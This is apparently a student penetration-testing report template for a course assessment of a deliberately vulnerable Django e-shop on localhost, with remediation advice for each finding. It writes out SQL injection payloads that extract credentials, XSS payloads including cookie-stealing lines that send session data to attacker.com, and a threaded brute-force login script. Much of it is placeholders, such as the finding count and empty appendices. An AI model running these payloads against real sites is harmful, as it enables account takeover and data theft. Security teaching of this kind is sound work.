# Penetration Testing Report - E-Shop Web Application

**Document Classification**: Confidential  
**Report Version**: 1.0  
**Date**: [DATE]  
**Prepared by**: [STUDENT NAME]  
**Course**: CDS201 - Έλεγχος Εισβολών Δικτύων και Συστημάτων  

---

## Executive Summary

### Scope
This penetration test was conducted on the E-Shop web application as part of the CDS201 course requirements. The assessment focused on identifying and exploiting web application vulnerabilities following the OWASP Web Security Testing Guide methodology.

### Key Findings
During the assessment, **[NUMBER]** critical vulnerabilities were identified that could lead to complete system compromise:

1. **SQL Injection** - Allows database access and data exfiltration
2. **Cross-Site Scripting (XSS)** - Enables session hijacking and phishing
3. **Authentication Bypass** - Permits unauthorized access through various methods
4. **[Additional vulnerabilities...]**

### Risk Rating
| Severity | Count | Impact |
|----------|-------|--------|
| Critical | 3 | Complete system compromise |
| High | 2 | Significant data exposure |
| Medium | 1 | Limited impact |
| Low | 0 | Minimal risk |

### Recommendations
Immediate remediation is required for all critical vulnerabilities. A comprehensive security review and implementation of secure coding practices is strongly recommended.

---

## 1. Introduction

### 1.1 Objective
The objective of this penetration test was to:
- Identify security vulnerabilities in the E-Shop web application
- Demonstrate exploitability of discovered vulnerabilities
- Provide actionable remediation recommendations
- Assess the overall security posture of the application

### 1.2 Methodology
The assessment followed the OWASP Web Security Testing Guide v4.2 methodology:

1. **Information Gathering**
2. **Configuration and Deployment Management Testing**
3. **Identity Management Testing**
4. **Authentication Testing**
5. **Session Management Testing**
6. **Input Validation Testing**
7. **Business Logic Testing**

### 1.3 Tools Used
- **Proxy Tools**: Burp Suite Community Edition, OWASP ZAP
- **SQL Injection**: SQLMap v1.7
- **XSS Testing**: XSStrike, Manual payloads
- **Brute Force**: Hydra, Custom Python scripts
- **Reconnaissance**: Nmap, Nikto
- **Custom Scripts**: Python with requests library

### 1.4 Testing Environment
- **URL**: http://localhost:8000
- **Testing Period**: [START DATE] to [END DATE]
- **Total Testing Hours**: [HOURS]
- **Tester**: [NAME]

---

## 2. Information Gathering

### 2.1 Application Mapping

**Discovered Endpoints**:
```
/ (GET) - Main catalog page
/login/ (GET, POST) - Authentication endpoint
/logout/ (GET) - Logout functionality
/catalog/ (GET) - Product search
/product/<id>/ (GET) - Product details
/product/<id>/review/ (POST) - Submit reviews
/payment/ (GET, POST) - Checkout process
/add-to-cart/ (POST) - AJAX cart management
/remove-from-cart/ (POST) - AJAX cart removal
/update-cart-item/ (POST) - AJAX cart update
```

### 2.2 Technology Stack
- **Framework**: Django 4.x
- **Database**: SQLite (development)
- **Frontend**: Bootstrap, jQuery
- **Server**: Django development server
- **Python Version**: 3.x

### 2.3 Authentication Mechanism
- Session-based authentication
- No multi-factor authentication
- Password storage using MD5 (weak)

---

## 3. Vulnerability Findings

### 3.1 SQL Injection (Critical)

**Vulnerability ID**: VULN-001  
**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-89  
**CVSS Score**: 9.8 (Critical)  

#### Description
The product search functionality is vulnerable to SQL injection due to unsanitized user input being directly concatenated into SQL queries.

#### Location
- **URL**: `/catalog/?q=[PAYLOAD]`
- **Parameter**: `q` (search query)
- **File**: `eshop/views.py`, lines 366-371

#### Proof of Concept

**Basic Boolean-based Injection**:
```http
GET /catalog/?q=' OR '1'='1 HTTP/1.1
Host: localhost:8000
```

**Union-based Data Extraction**:
```http
GET /catalog/?q=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user-- HTTP/1.1
Host: localhost:8000
```

**Screenshot**:
[Insert screenshot showing successful SQL injection]

#### Impact
- Complete database access
- User credential theft
- Data manipulation capability
- Potential server compromise

#### Remediation
1. Use parameterized queries with Django ORM:
```python
products = Product.objects.filter(
    Q(name__icontains=search_query) | 
    Q(description__icontains=search_query)
)
```
2. Implement input validation
3. Apply principle of least privilege to database user

---

### 3.2 Cross-Site Scripting (XSS) - Multiple Instances (High)

**Vulnerability ID**: VULN-002  
**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-79  
**CVSS Score**: 7.5 (High)  

#### 3.2.1 Reflected XSS

##### Description
Search results are displayed without proper encoding, allowing script injection.

##### Location
- **URL**: `/catalog/?q=[PAYLOAD]`
- **Template**: `catalog.html`, line 26

##### Proof of Concept
```http
GET /catalog/?q=<script>alert('XSS')</script> HTTP/1.1
Host: localhost:8000
```

**Advanced Payload** (Cookie Stealer):
```javascript
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

#### 3.2.2 Stored XSS

##### Description
Product reviews are stored and displayed without sanitization.

##### Location
- **Feature**: Product Review System
- **Endpoints**: `/product/<id>/` and `/product/<id>/review/`

##### Proof of Concept
```http
POST /product/1/review/ HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded

title=Great+Product&content=<script>alert('Stored+XSS')</script>&rating=5
```

#### Impact
- Session hijacking
- Phishing attacks
- Defacement
- Malware distribution

#### Remediation
1. Enable Django auto-escaping
2. Implement Content Security Policy
3. Use bleach library for input sanitization
4. Validate all user inputs

---

### 3.3 Authentication Vulnerabilities (Critical)

**Vulnerability ID**: VULN-003  
**OWASP Category**: A07:2021 – Identification and Authentication Failures  
**CWE**: CWE-203, CWE-307, CWE-916  
**CVSS Score**: 8.5 (High)  

#### 3.3.1 User Enumeration

##### Description
Different error messages allow attackers to determine valid usernames.

##### Proof of Concept
```python
# Valid username response
POST /login/
username=admin&password=wrongpass
Response: "Invalid password for user 'admin'"

# Invalid username response
POST /login/
username=doesnotexist&password=wrongpass
Response: "Username 'doesnotexist' does not exist in our system"
```

#### 3.3.2 Brute Force Vulnerability

##### Description
No rate limiting allows unlimited login attempts.

##### Proof of Concept
```python
import requests
import concurrent.futures

def brute_force(username, passwords):
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        for password in passwords:
            response = executor.submit(try_login, username, password)
            if "Invalid password" not in response.result():
                return password
```

#### 3.3.3 Weak Password Storage

##### Description
Passwords are hashed using MD5, which is cryptographically broken.

##### Evidence
```python
# From settings.py
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.MD5PasswordHasher',
]
```

#### Impact
- Account takeover
- Mass credential theft
- Admin access compromise

#### Remediation
1. Implement generic error messages
2. Add rate limiting and account lockout
3. Use Argon2 password hashing
4. Implement CAPTCHA
5. Add multi-factor authentication

---

### 3.4 Session Management Issues (High)

**Vulnerability ID**: VULN-004  
**OWASP Category**: A07:2021 – Identification and Authentication Failures  
**CWE**: CWE-614  
**CVSS Score**: 7.0 (High)  

#### Description
Session cookies lack security flags, making them vulnerable to theft.

#### Configuration Issues
```python
SESSION_COOKIE_HTTPONLY = False  # Allows JavaScript access
SESSION_COOKIE_SECURE = False    # Sent over HTTP
# SESSION_COOKIE_SAMESITE not set
```

#### Proof of Concept
```javascript
// XSS payload to steal session
var sessionId = document.cookie.match(/sessionid=([^;]+)/)[1];
fetch('http://attacker.com/steal?session=' + sessionId);
```

#### Remediation
1. Set `SESSION_COOKIE_HTTPONLY = True`
2. Set `SESSION_COOKIE_SECURE = True`
3. Set `SESSION_COOKIE_SAMESITE = 'Lax'`

---

### 3.5 Security Misconfiguration (Medium)

**Vulnerability ID**: VULN-005  
**OWASP Category**: A05:2021 – Security Misconfiguration  
**CWE**: CWE-489  
**CVSS Score**: 5.3 (Medium)  

#### Description
Debug mode is enabled in production, exposing sensitive information.

#### Evidence
- `DEBUG = True` in settings.py
- Detailed error pages with stack traces
- Database query information exposed

#### Remediation
1. Set `DEBUG = False` in production
2. Configure proper error handling
3. Remove sensitive information from error pages

---

## 4. Post-Exploitation

### 4.1 Data Exfiltration
Using SQL injection, the following sensitive data was extracted:
- User credentials (usernames and password hashes)
- Personal information (names, addresses, phone numbers)
- Order history and payment information

### 4.2 Privilege Escalation
Through SQL injection, admin credentials were obtained:
```sql
' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user WHERE is_superuser=1--
```

### 4.3 Persistence
XSS payloads were successfully stored in:
- Product reviews
- User profile fields
- Shipping addresses

---

## 5. Risk Assessment

### 5.1 Risk Matrix

| Vulnerability | Likelihood | Impact | Risk Level |
|--------------|------------|---------|------------|
| SQL Injection | High | Critical | Critical |
| XSS (Stored) | High | High | High |
| User Enumeration | High | Medium | High |
| Weak Passwords | High | High | High |
| Debug Mode | Medium | Medium | Medium |

### 5.2 Business Impact Analysis

**Financial Impact**:
- Direct financial loss from fraudulent orders
- Regulatory fines (GDPR violations)
- Legal costs from data breach

**Reputational Impact**:
- Loss of customer trust
- Negative media coverage
- Long-term brand damage

**Operational Impact**:
- System downtime
- Incident response costs
- Recovery and remediation expenses

---

## 6. Recommendations

### 6.1 Immediate Actions (Critical)

1. **Fix SQL Injection**
   - Implement parameterized queries
   - Use Django ORM exclusively
   - Enable SQL query logging

2. **Remediate XSS**
   - Enable auto-escaping
   - Implement CSP headers
   - Sanitize all inputs

3. **Strengthen Authentication**
   - Use Argon2 hashing
   - Implement rate limiting
   - Add MFA

### 6.2 Short-term Improvements (1-3 months)

1. **Security Headers**
   - Implement all security headers
   - Configure CSP properly
   - Enable HSTS

2. **Input Validation**
   - Implement server-side validation
   - Use whitelisting approach
   - Validate data types and ranges

3. **Session Security**
   - Secure cookie flags
   - Implement session timeout
   - Add session fixation protection

### 6.3 Long-term Security Program (3-6 months)

1. **Security Development Lifecycle**
   - Security training for developers
   - Code review process
   - Security testing in CI/CD

2. **Monitoring and Logging**
   - Implement SIEM
   - Security event monitoring
   - Incident response plan

3. **Regular Assessments**
   - Quarterly security scans
   - Annual penetration tests
   - Continuous vulnerability management

---

## 7. Conclusion

The penetration test revealed critical vulnerabilities that pose significant risk to the organization. The application's current security posture is inadequate for production use. 

**Key Takeaways**:
- All OWASP Top 10 categories should be addressed
- Security must be integrated into the development lifecycle
- Regular security assessments are essential

Immediate action is required to remediate the identified vulnerabilities before any production deployment.

---

## Appendices

### Appendix A: Testing Methodology Details
[Detailed methodology steps and procedures]

### Appendix B: Tool Outputs
[Raw tool outputs and logs]

### Appendix C: Exploit Code
[Full exploit scripts and payloads]

### Appendix D: References
- OWASP Top 10 2021
- OWASP Web Security Testing Guide
- CWE Database
- NIST Cybersecurity Framework

---

**Report Prepared By**: [Name]  
**Date**: [Date]  
**Signature**: _________________

**Reviewed By**: [Supervisor Name]  
**Date**: [Date]  
**Signature**: _________________